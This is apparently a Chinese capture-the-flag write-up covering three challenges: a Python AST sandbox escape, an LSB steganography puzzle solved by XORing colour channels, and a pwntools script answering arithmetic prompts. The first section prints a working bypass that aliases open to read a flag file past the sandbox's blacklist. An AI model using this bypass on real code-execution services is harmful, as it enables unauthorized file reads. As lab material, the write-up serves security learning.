## 漏风的沙箱

源码很长，我们重点看AST沙箱这部分

```Python
class ASTFilter(ast.NodeVisitor):# 继承 NodeVisitor，重写 visit_XXX 方法，对特定节点做检查
    def visit_Import(self, node):# 重写处理import的语句，一旦有 import 就拒绝
        for alias in node.names:
            raise FilterError()
        self.generic_visit(node)

    def visit_ImportFrom(self, node):# 处理 from xxx import yyy 语句
        raise FilterError()

    def visit_Attribute(self, node):# 处理属性访问，如 obj.attr
        if node.attr in DANGEROUS_ATTRIBUTES:# 如果访问的是危险魔术属性，拒绝
            raise FilterError()
        if node.attr in BANNED_METHODS:# 如果访问的是禁止的方法名，拒绝
            raise FilterError()
        if node.attr in BANNED_FUNCTIONS:# 如果访问的是禁止的函数名（作为属性），拒绝
            raise FilterError()
        self.generic_visit(node)

    def visit_Call(self, node):# 处理函数调用，如 f(...)
        func = node.func
        if isinstance(func, ast.Name) and func.id in BANNED_FUNCTIONS:#禁用在黑名单的函数
            raise FilterError()
        self.generic_visit(node)

    def visit_Subscript(self, node):# 处理下标访问，如 obj[key]
        if isinstance(node.slice, ast.Constant) and isinstance(node.slice.value, str):
            key = node.slice.value
            if key in DANGEROUS_ATTRIBUTES or key in BANNED_METHODS \
                    or key in BANNED_FUNCTIONS or key in BANNED_MODULES:#禁用了一些模块、函数、魔术方法
                raise FilterError()
        self.generic_visit(node)


def _sandbox_builtins():
    b = dict(builtins.__dict__) #受限的沙箱，一些危险方法仍在！
    b.pop('breakpoint', None)
    b.pop('input', None)
    return b


SANDBOX_BUILTINS = _sandbox_builtins()


def run_sandbox(code):
    code = unicodedata.normalize('NFKC', code) #NFKC归一化，防止Unicode绕过

    for pattern in COMPILED_PATTERNS: #正则过滤
        if pattern.search(code):
            return {'status': 'blocked', 'output': ''}

    try:
        tree = ast.parse(code) #解析源码为AST
    except SyntaxError:
        return {'status': 'blocked', 'output': ''}

    visitor = ASTFilter() #创建AST过滤器
    try:
        visitor.visit(tree)
    except FilterError:
        return {'status': 'blocked', 'output': ''}

    sandbox = {'__builtins__': dict(SANDBOX_BUILTINS)}
    buf = io.StringIO()
    result = {}

    def _exec():
        try:
            with redirect_stdout(buf):
                exec(code, sandbox)
            result['output'] = buf.getvalue()
        except SystemExit:
            result['error'] = 'SystemExit'
        except BaseException:
            result['error'] = traceback.format_exc()

    worker = threading.Thread(target=_exec, daemon=True)
    worker.start()
    worker.join(SANDBOX_TIMEOUT)
    if worker.is_alive():
        return {'status': 'timeout', 'output': ''}

    if 'error' in result:
        return {'status': 'error',
                'output': (buf.getvalue() + '\n' + result['error'])[:MAX_OUTPUT_LEN]}

    output = result.get('output', '')
    if len(output) > MAX_OUTPUT_LEN:
        output = output[:MAX_OUTPUT_LEN]
    return {'status': 'ok', 'output': output}
```

也就是说一共三层WAF，第一层是正则过滤并且做了NFKC归一化处理不能用Unicode绕过；第二层是AST沙箱，对一些函数名方法名进行了检查，不能出现在黑名单中；第三层就是受限的沙箱，但是open、eval等危险方法仍然存在。

```Python
o = open
print(*o('/app/flag.txt'))
```

- `o = open` 里的 `open` 是一个 `ast.Name`，不是 `ast.Call`，所以 `visit_Call` 不检查它；`visit_Attribute` 也管不到（它不是属性访问）。
- `o('/app/flag.txt')` 是一个 `ast.Call`，但 `func` 是 `ast.Name`，`id == 'o'`，**不在** `BANNED_FUNCTIONS` 里 → 放行。

## Strange_lsb

单通道全是噪音没有信息，题目名称叫strange，就怪在信息在三个通道 LSB 的异或平面上：

```
X = (R & 1) ^ (G & 1) ^ (B & 1)   # 逐像素异或最低位
```

脚本解出一个二维码，扫码即可

```Python
from PIL import Image

SRC = "challenge.png"
OUT = "flag.png"

img = Image.open(SRC).convert("RGB")
w, h = img.size

out = Image.new("L", (w, h))
pix = out.load()
src = img.load()

for y in range(h):
    for x in range(w):
        r, g, b = src[x, y]
        xbit = (r & 1) ^ (g & 1) ^ (b & 1)
        pix[x, y] = 255 if xbit else 0

out.save(OUT)
print("saved:", OUT, "size:", out.size)
```

## ！？数学基础？！

写脚本计算即可

```Python
from pwn import *
import re

io = remote('nc1.ctfplus.cn', 46257)

for i in range(100):
    data = io.recvuntil(b'Input your answer:').decode()
    print(data)

    m = re.search(r'calculate:\s*(\d+)\s*(\S+)\s*(\d+)\s*=', data)
    if not m:
        print("解析失败")
        break

    a = int(m.group(1))
    op = m.group(2)
    b = int(m.group(3))

    if op in ('+', '＋'):
        ans = a + b
    elif op in ('-', '－', '一', '—', '–'):
        ans = a - b
    elif op in ('×', '*', '＊', 'x', 'X'):
        ans = a * b
    elif op in ('÷', '/', '／'):
        ans = a // b
    else:
        raise ValueError(f"未知运算符: {op!r}")

    io.sendline(str(ans).encode())

io.interactive()
```
